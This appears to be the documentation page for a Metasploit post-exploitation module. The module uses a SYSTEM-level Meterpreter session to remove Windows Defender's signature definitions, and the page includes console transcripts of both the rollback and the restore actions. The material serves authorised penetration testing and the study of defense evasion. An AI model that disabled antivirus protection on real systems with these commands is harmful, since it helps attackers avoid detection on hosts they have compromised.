## Vulnerable Application
### Overview
This module requires system privs

This module rolls back the signatures in Windows Defender to the
earliest signatures. The level of protection is somewhat indeterminate.
This action is accomplished by running the command:
`MpCmdRun.exe -RemoveDefinitions -All`

To recover, you can run `MpCmdRun.exe -UpdateSignatures`.
That will force Windows Defender to update the signatures
to the latest version available from Microsoft.

## Verification Steps
1. Get a Meterpreter session as the `NT AUTHORITY\SYSTEM` user.
1. `use post/windows/manage/rollback_defender_signatures`
1. `set SESSION <ID of Meterpreter session>`
1. Optionally set the ACTION to run with `set ACTION <action to run>`
1. `run`

## Options
### ACTION
#### ROLLBACK
Rolls the Windows Defender signature definitions back to the earliest available signatures.

### UPDATE
Updates the Windows Defender signature definitions to the latest versions available from Microsoft.

## Scenarios
### ROLLBACK Action on Windows Server 2022
```
msf6 > sessions

Active sessions
===============

  Id  Name  Type                     Information                            Connection
  --  ----  ----                     -----------                            ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ WIN-BR0CCBA815B  172.28.94.235:45437 -> 172.28.82.203:4444 (172.28
                                                                            .82.203)

msf6 > use post/windows/manage/rollback_defender_signatures 
msf6 post(windows/manage/rollback_defender_signatures) > set SESSION 1 
SESSION => 1
msf6 post(windows/manage/rollback_defender_signatures) > show options

Module options (post/windows/manage/rollback_defender_signatures):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on


Post action:

   Name      Description
   ----      -----------
   ROLLBACK  Rollback Defender signatures


msf6 post(windows/manage/rollback_defender_signatures) > run

[*] Removing all definitions for Windows Defender
[*] Running cmd.exe /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
[*] 
Service Version: 4.18.2207.7
Engine Version: 1.1.19600.3
AntiSpyware Signature Version: 1.375.652.0
AntiVirus Signature Version: 1.375.652.0

Starting engine and signature rollback to none...
Done!
[*] Post module execution completed
msf6 post(windows/manage/rollback_defender_signatures) > 
```

## UPDATE Action on Windows Server 2022
```
msf6 > sessions

Active sessions
===============

  Id  Name  Type                     Information                            Connection
  --  ----  ----                     -----------                            ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ WIN-BR0CCBA815B  172.28.94.235:45437 -> 172.28.82.203:4444 (172.28
                                                                            .82.203)

msf6 > use post/windows/manage/rollback_defender_signatures 
msf6 post(windows/manage/rollback_defender_signatures) > set SESSION 1 
SESSION => 1
msf6 post(windows/manage/rollback_defender_signatures) > set ACTION UPDATE 
ACTION => UPDATE
msf6 post(windows/manage/rollback_defender_signatures) > show options

Module options (post/windows/manage/rollback_defender_signatures):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on


Post action:

   Name    Description
   ----    -----------
   UPDATE  Update Defender signatures


msf6 post(windows/manage/rollback_defender_signatures) > run

[*] Updating definitions for Windows Defender
[*] Running cmd.exe /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -SignatureUpdate
[*] Signature update started . . .
Service Version: 4.18.2207.7
Engine Version: 1.1.19600.3
AntiSpyware Signature Version: 1.375.652.0
AntiVirus Signature Version: 1.375.652.0
Signature update finished. No updates needed
[*] Post module execution completed
msf6 post(windows/manage/rollback_defender_signatures) > 
```
